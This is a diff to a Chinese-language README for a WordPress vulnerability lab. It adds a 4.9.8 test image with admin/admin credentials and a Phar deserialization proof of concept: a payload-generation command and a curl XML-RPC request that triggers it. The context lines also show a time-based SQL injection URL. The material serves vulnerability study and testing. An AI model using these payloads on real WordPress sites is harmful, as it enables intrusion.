@@ -1,6 +1,6 @@
 ## 环境说明
 
-- 镜像src/wordpress/4.6.1/
+- src/wordpress/4.6.1/
 
   - 后台地址
 
@@ -9,6 +9,20 @@
   - 账号/密码
 
     admin/admin
+
+- src/wordpress/4.9.8/
+
+  - 后台地址
+
+    http://127.0.0.1/wp-login.php
+
+  - 账号/密码
+
+    admin/admin
+
+  - 说明
+
+    从4.6.1升级产生，已安装插件**WooCommerce**
 
 
 
@@ -100,3 +114,36 @@ curl 'http://172.17.0.2/wp-admin/admin-ajax.php' --cookie "登录后的cookie" -
 `<input type="hidden" id="_wpnonce" name="_wpnonce" value="233a3d3d36">`
 
 6、使用获取的\_wpnonce参数访问`http://172.17.0.2/wp-admin/edit.php?action=delete&_wpnonce=获取的参数&ids=4%20%251$%25s%20or%20sleep(10)%23`触发漏洞（产生查询延迟）
+
+
+
+## Wordpress Phar反序列化漏洞
+
+测试镜像
+
+- src/wordpress/4.9.8/
+
+影响版本
+
+- wordpress <= 4.8.9 尚未修复
+
+参考链接
+
+- [利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)
+
+Poc
+
+测试镜像中已经完成了上传包含phar序列化payload的文件，只需要触发反序列化即可，如果需要生成其他的payload，可以使用以下命令生成并上传：
+
+```shell
+php -d phar.readonly=false gen-phar-payload.php
+```
+
+测试命令
+
+```shell
+curl -d "<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>wp.getMediaItem</methodName><params><param><value><string>11</string></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param><param><value><int>12</int></value></param></params></methodCall>"  http://127.0.0.1/xmlrpc.php
+```
+
+
+
